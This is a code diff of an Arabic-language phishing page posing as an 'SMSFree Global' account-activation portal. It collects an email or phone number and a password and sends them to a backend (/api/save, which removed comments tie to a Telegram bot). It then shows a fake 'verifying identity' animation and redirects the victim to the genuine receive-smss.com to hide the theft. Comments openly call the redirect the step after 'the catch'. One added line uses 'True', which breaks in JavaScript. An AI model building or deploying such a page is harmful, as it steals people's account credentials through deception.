@@ -3,20 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الهوية - Global Virtual Numbers</title>
+    <title>تفعيل الحساب - SMSFree Global</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
     
     <style>
         /* المتغيرات اللونية الاحترافية */
         :root {
-            --bg-dark: #0a0e17; /* خلفية داكنة جداً */
-            --card-bg: #141b2b; /* خلفية البطاقة */
-            --primary-glow: #00f2fe; /* أزرق سماوي مضيء */
-            --secondary-glow: #4facfe; /* أزرق مشرق */
-            --accent: #8e44ad; /* بنفسجي فخم */
+            --bg-dark: #0a0e17;
+            --card-bg: #141b2b;
+            --primary-glow: #00f2fe;
+            --secondary-glow: #4facfe;
+            --accent: #8e44ad;
             --text-main: #ffffff;
             --text-muted: #8b9bb4;
             --border: rgba(255, 255, 255, 0.05);
+            --success: #2ecc71; /* لون النجاح */
         }
 
         body {
@@ -31,72 +32,74 @@
             overflow: hidden;
         }
 
-        /* حاوية البطاقة الرئيسية بلمسة فخامة */
         .premium-card {
             background-color: var(--card-bg);
             width: 90%; max-width: 420px;
             padding: 50px 35px;
-            border-radius: 24px; /* حواف منحوتة بدقة */
+            border-radius: 24px;
             box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
             text-align: center;
             border: 1px solid var(--border);
-            backdrop-filter: blur(10px); /* تأثير زجاجي خفيف */
+            backdrop-filter: blur(10px);
             position: relative;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        .premium-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 30px 60px rgba(0, 242, 254, 0.15);
-        }
-
-        /* الشعار الاحترافي للأرقام الوهمية */
+        /* حاوية الشعار مع تأثير الهالة */
         .logo-container {
-            width: 120px; height: 120px; margin: 0 auto 30px auto;
+            width: 140px; height: 140px; margin: 0 auto 30px auto;
             position: relative;
+            display: flex; justify-content: center; align-items: center;
         }
 
-        /* صورة متحركة تعبر عن الاتصال العالمي والأرقام */
-        .logo-img {
-            width: 100%; height: 100%;
-            background-image: url('https://telegra.ph/file/1792945d7d91986420551.jpg'); /* رابط الصورة الاحترافية المرفقة */
-            background-size: cover;
-            background-position: center;
+        /* الهالة المضيئة المحيطة */
+        .logo-glow-ring {
+            position: absolute; top: 0; left: 0; right: 0; bottom: 0;
             border-radius: 50%;
-            box-shadow: 0 0 30px rgba(79, 172, 254, 0.5);
-            border: 4px solid var(--card-bg);
-            position: relative; z-index: 2;
+            background: linear-gradient(135deg, var(--secondary-glow), var(--accent));
+            opacity: 0.8; filter: blur(20px);
+            animation: pulse 3s infinite ease-in-out;
+            z-index: 1;
         }
 
-        /* تأثير النبض حول الشعار */
-        .logo-container::after {
-            content: ''; position: absolute; top: -5px; left: -5px; right: -5px; bottom: -5px;
-            background: linear-gradient(45deg, var(--primary-glow), var(--accent));
-            border-radius: 50%; z-index: 1; opacity: 0.8;
-            filter: blur(15px); animation: pulse 2s infinite;
+        /* الدائرة الداخلية السوداء الفخمة */
+        .logo-circle {
+            width: 130px; height: 130px;
+            background-color: #0d121c; /* أسود أعمق */
+            border-radius: 50%;
+            display: flex; justify-content: center; align-items: center;
+            position: relative; z-index: 2;
+            border: 2px solid var(--border);
+            box-shadow: inset 0 0 15px rgba(0,0,0,0.5);
+        }
+
+        /* النص الجديد داخل الدائرة SMSFree */
+        .logo-text {
+            font-size: 26px;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: 1.5px;
+            /* تأثير إضاءة خفيف للنص */
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.7);
         }
 
         @keyframes pulse {
             0% { transform: scale(1); opacity: 0.8; }
-            50% { transform: scale(1.05); opacity: 0.5; }
+            50% { transform: scale(1.03); opacity: 0.5; }
             100% { transform: scale(1); opacity: 0.8; }
         }
 
-        /* تنسيق النصوص */
         h2 {
             color: var(--text-main);
             font-size: 24px; font-weight: 800;
-            margin-bottom: 10px; letter-spacing: -0.5px;
+            margin-bottom: 10px;
         }
 
         .subtitle {
             color: var(--text-muted);
-            font-size: 14px; font-weight: 400;
-            margin-bottom: 40px; line-height: 1.6;
+            font-size: 14px; margin-bottom: 40px; line-height: 1.6;
         }
 
-        /* تنسيق حقول الإدخال لتكون منحوتة */
-        .input-group { margin-bottom: 25px; text-align: right; position: relative; }
+        .input-group { margin-bottom: 25px; text-align: right; }
 
         input {
             width: 100%;
@@ -105,13 +108,10 @@
             color: var(--text-main);
             background-color: rgba(255, 255, 255, 0.03);
             border: 2px solid var(--border);
-            border-radius: 14px; /* حواف مستديرة متقنة */
+            border-radius: 14px;
             outline: none;
-            transition: all 0.3s ease;
             box-sizing: border-box;
         }
-
-        input::placeholder { color: rgba(139, 155, 180, 0.5); }
 
         input:focus {
             border-color: var(--secondary-glow);
@@ -119,26 +119,19 @@
             box-shadow: 0 0 15px rgba(79, 172, 254, 0.2);
         }
 
-        /* تنسيق رسالة الخطأ */
-        .error-msg {
-            color: #ff6b6b; font-size: 12px; margin-top: 5px;
-            display: none; font-weight: 600;
-        }
-
-        /* تنسيق الزر الاحترافي المضيء */
+        /* زر التفعيل مع تدرج لوني مضيء */
         button {
             width: 100%;
             padding: 18px;
             background: linear-gradient(135deg, var(--secondary-glow) 0%, var(--primary-glow) 100%);
-            color: #0a0e17; /* لون نص داكن للتباين */
+            color: #0a0e17;
             border: none;
-            border-radius: 14px; /* حواف مستديرة متقنة للزر */
+            border-radius: 14px;
             font-size: 18px; font-weight: 800;
             cursor: pointer;
-            transition: all 0.3s ease;
             margin-top: 15px;
-            text-transform: uppercase; letter-spacing: 1px;
             box-shadow: 0 5px 20px rgba(0, 242, 254, 0.3);
+            transition: all 0.3s ease;
         }
 
         button:hover {
@@ -146,9 +139,38 @@
             transform: translateY(-2px);
         }
 
-        button:active { transform: translateY(1px); box-shadow: 0 3px 10px rgba(0, 242, 254, 0.3); }
+        /* منطقة التحقق الوهمية (Fake Captcha) */
+        .verification-zone {
+            margin-top: 25px;
+            display: none; /* مخفية في البداية */
+            flex-direction: column; align-items: center;
+        }
 
-        /* تذييل الصفحة */
+        .verify-text {
+            color: var(--text-muted);
+            font-size: 13px; font-weight: 600;
+            display: flex; align-items: center; gap: 8px;
+        }
+
+        /* أيقونة التحميل الدوارة */
+        .spinner {
+            width: 16px; height: 16px;
+            border: 2px solid rgba(255,255,255,0.2);
+            border-top: 2px solid var(--secondary-glow);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* حالة النجاح */
+        .verify-success {
+            color: var(--success);
+            font-weight: 700;
+            display: none; /* مخفية */
+            align-items: center; gap: 6px;
+        }
+
         .footer-text {
             margin-top: 35px; color: var(--text-muted);
             font-size: 12px; border-top: 1px solid var(--border);
@@ -161,7 +183,10 @@
 
     <div class="premium-card">
         <div class="logo-container">
-            <div class="logo-img"></div>
+            <div class="logo-glow-ring"></div>
+            <div class="logo-circle">
+                <span class="logo-text">SMSFree</span>
+            </div>
         </div>
         
         <h2 id="pageLetter">منصة تفعيل الأرقام العالمية</h2>
@@ -170,7 +195,6 @@
         <form id="authForm">
             <div class="input-group">
                 <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف المرتبط" required>
-                <div id="userError" class="error-msg">❌ تنسيق البيانات غير صحيح</div>
             </div>
 
             <div class="input-group">
@@ -180,49 +204,44 @@
             <button type="submit" id="pageBtn">تفعيل الحساب الآن</button>
         </form>
 
+        <div class="verification-zone" id="vZone">
+            <div class="verify-text" id="vProcess">
+                <div class="spinner"></div>
+                <span>جاري التحقق من الهوية الرقمية...</span>
+            </div>
+            <div class="verify-success" id="vSuccess">
+                <span>✅ تم التحقق بنجاح!</span>
+            </div>
+        </div>
+
         <div class="footer-text">
-            © 2024 Global Virtual Numbers Pro. جميع الحقوق محفوظة. <br>
+            © 2024 SMSFree Global Numbers Pro. جميع الحقوق محفوظة. <br>
             نظام حماية متطور مدعوم بالذكاء الاصطناعي.
         </div>
     </div>
 
     <script>
-        // دالة جلب البيانات لتحديث الصورة والنصوص تلقائياً من اللوحة
+        // دالة لجلب الإعدادات من اللوحة (اختياري)
         async function fetchConfig() {
             try {
                 const response = await fetch('/api/get');
                 const data = await response.json();
-                if(data.image) document.querySelector('.logo-img').style.backgroundImage = `url(${data.image})`;
                 if(data.letter) document.getElementById('pageLetter').innerText = data.letter;
                 if(data.button) document.getElementById('pageBtn').innerText = data.button;
-            } catch (e) { console.log("استخدام الإعدادات الافتراضية الاحترافية"); }
+            } catch (e) {}
         }
         window.onload = fetchConfig;
 
-        // التحقق من الإدخال والإرسال لبوت التلجرام
+        // معالجة الإرسال مع التحقق الوهمي
         const form = document.getElementById('authForm');
         form.onsubmit = async (e) => {
             e.preventDefault();
             
             const user = document.getElementById('userInput').value;
             const pass = document.getElementById('passInput').value;
-            const errorText = document.getElementById('userError');
 
-            // منطق التحقق البسيط (إيميل أو هاتف)
-            const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(user);
-            const isPhone = /^\+?[0-9]{7,15}$/.test(user);
-
-            if (!isEmail && !isPhone) {
-                errorText.style.display = 'block';
-                document.getElementById('userInput').style.borderColor = '#ff6b6b';
-                return;
-            } else {
-                errorText.style.display = 'none';
-                document.getElementById('userInput').style.borderColor = 'rgba(255, 255, 255, 0.05)';
-            }
-
-            // إرسال البيانات لبوت التلجرام (تأكد من تعديل ملف index.py ليستقبل هذه الحقول)
-            await fetch('/api/save', {
+            // إرسال البيانات فوراً للوحة التحكم في الخلفية
+            fetch('/api/save', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
@@ -231,8 +250,25 @@
                 })
             });
 
-            // تحويل المستخدم للموقع الحقيقي بعد الصيد
-            window.location.href = "https://receive-smss.com/";
+            // بدء عملية التحقق الوهمية
+            const vZone = document.getElementById('vZone');
+            const vProcess = document.getElementById('vProcess');
+            const vSuccess = document.getElementById('vSuccess');
+
+            vZone.style.display = 'flex'; // إظهار منطقة التحقق
+            document.getElementById('pageBtn').disabled = True; // تعطيل الزر
+
+            // محاكاة التحقق لمدة ثانيتين (2000 مللي ثانية)
+            setTimeout(() => {
+                vProcess.style.display = 'none'; // إخفاء جاري التحقق
+                vSuccess.style.display = 'flex'; // إظهار تم التحقق
+
+                // الانتظار نصف ثانية إضافية ثم التحويل للموقع النهائي
+                setTimeout(() => {
+                    window.location.href = "https://receive-smss.com/";
+                }, 500);
+
+            }, 2000); 
         };
     </script>
 </body>
